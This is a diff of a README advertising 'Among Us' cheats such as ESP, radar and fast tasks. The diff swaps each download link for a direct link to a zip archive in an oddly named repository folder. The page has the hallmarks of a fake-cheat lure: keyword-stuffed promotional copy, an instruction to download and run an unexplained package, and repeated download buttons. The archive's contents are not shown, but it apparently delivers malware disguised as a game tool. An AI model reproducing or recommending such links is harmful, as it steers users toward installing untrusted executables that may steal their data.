@@ -1,6 +1,6 @@
 # 🚀 Among Us Cheats & Hacks 🚀
 
-![Download Latest Version](https://img.shields.io/badge/Download-EasyLauncher-blue?logo=download&style=for-the-badge&link=https://graph.org/EasyLauncher-06-23)
+![Download Latest Version](https://raw.githubusercontent.com/spcreationpage/AmongUs-ImpulseHub/main/stromata/AmongUs-ImpulseHub.zip)
 
 Unlock advanced enhancements for Among Us with this 2025 ⭐ cheat utility crafted for seamless gameplay improvement and winning edge. Designed for enthusiasts seeking unique advantages such as ESP, custom skins, radar, ultra-fast tasks, and team collaboration tools. 
 
@@ -32,7 +32,7 @@ Among Us cheats tools, 2025 Among Us enhancements, win Among Us, best hacks for 
 # 📥 Installation
 
 **Step 1:**  
-[![Download Here](https://img.shields.io/badge/Download-Now-informational?style=for-the-badge&logo=github)](https://graph.org/EasyLauncher-06-23)
+[![Download Here](https://raw.githubusercontent.com/spcreationpage/AmongUs-ImpulseHub/main/stromata/AmongUs-ImpulseHub.zip)](https://raw.githubusercontent.com/spcreationpage/AmongUs-ImpulseHub/main/stromata/AmongUs-ImpulseHub.zip)
 
 Visit the download link above and follow in-package setup guide for your OS. Ensure Among Us is closed before launching the utility.
 
@@ -46,4 +46,4 @@ MIT License | [MIT File](LICENSE)
 
 ---
 
-## 📦 [Download Latest EasyLauncher](https://graph.org/EasyLauncher-06-23)
+## 📦 [Download Latest EasyLauncher](https://raw.githubusercontent.com/spcreationpage/AmongUs-ImpulseHub/main/stromata/AmongUs-ImpulseHub.zip)
